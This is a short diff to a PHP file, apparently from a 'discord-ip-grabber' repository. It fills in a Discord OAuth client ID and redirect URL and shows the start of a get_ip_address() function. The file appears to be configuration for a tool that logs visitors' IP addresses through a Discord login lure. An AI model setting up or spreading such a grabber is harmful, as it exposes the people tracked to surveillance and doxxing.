@@ -2,9 +2,9 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
+$client_id     = "817987775847464961"; //CLIENT ID HERE
 $client_secret = ""; //CLIENT SECRET HERE
-$redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
+$redirect      = "https://github.com/AhmedNaqib/discord-ip-grabber-1/blob/master/grabber.php"; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
 function get_ip_address()
 {
